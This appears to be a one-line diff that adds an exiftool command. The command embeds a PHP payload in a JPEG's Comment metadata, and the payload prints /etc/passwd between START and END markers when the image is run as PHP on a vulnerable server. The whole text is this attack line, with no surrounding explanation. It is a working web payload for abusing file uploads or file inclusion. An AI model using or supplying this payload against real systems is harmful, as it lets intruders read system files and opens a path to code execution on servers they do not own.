@@ -1,0 +1,1 @@
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" image.jpg -o new_image.jpg
